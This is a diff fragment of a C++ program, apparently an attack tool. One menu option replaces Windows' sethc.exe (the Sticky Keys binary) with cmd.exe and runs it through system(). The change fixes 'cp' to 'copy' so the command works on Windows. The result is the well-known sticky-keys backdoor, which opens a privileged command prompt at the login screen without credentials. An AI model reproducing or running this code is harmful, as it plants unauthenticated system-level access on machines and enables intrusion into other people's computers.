@@ -68,7 +68,7 @@ int main(){
 
         if (choice == "1"){
             // Replace sethc.exe to cmd.exe
-            string payload = "move " + bin_path + "\\sethc.exe " + bin_path + "\\sethc.exe.bak && cp " + bin_path + "\\cmd.exe " + bin_path + "\\sethc.exe";
+            string payload = "move " + bin_path + "\\sethc.exe " + bin_path + "\\sethc.exe.bak && copy " + bin_path + "\\cmd.exe " + bin_path + "\\sethc.exe";
             system(payload.c_str());
 
             // Show success message 
